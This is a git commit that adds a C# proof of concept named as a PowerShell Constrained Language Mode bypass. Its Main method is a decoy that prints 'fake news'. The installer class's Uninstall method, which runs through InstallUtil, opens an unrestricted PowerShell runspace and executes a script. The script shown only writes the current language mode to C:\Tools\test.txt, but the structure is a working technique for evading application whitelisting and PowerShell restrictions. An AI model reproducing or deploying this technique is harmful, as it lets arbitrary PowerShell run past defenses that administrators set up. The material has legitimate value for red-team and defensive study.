ba957e258e60939a3305f95946941254ba07ebd8
Duane Michael <dmichaeljr@pm.me>
2021-04-07 18:53:20 -0600

    Initial.

---
+++ posh_clm_bypass/clm_bypass/Program.cs
@@ -0,0 +1,32 @@
+﻿using System;
+using System.Management.Automation;
+using System.Management.Automation.Runspaces;
+using System.Configuration.Install;
+
+namespace Bypass
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            Console.WriteLine("fake news");
+        }
+    }
+    [System.ComponentModel.RunInstaller(true)]
+    public class Sample : System.Configuration.Install.Installer
+    {
+        public override void Uninstall(System.Collections.IDictionary savedState)
+        {
+            String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Tools\\test.txt";
+            Runspace rs = RunspaceFactory.CreateRunspace();
+            rs.Open();
+
+            PowerShell ps = PowerShell.Create();
+            ps.Runspace = rs;
+
+            ps.AddScript(cmd);
+            ps.Invoke();
+            rs.Close();
+        }
+    }
+}
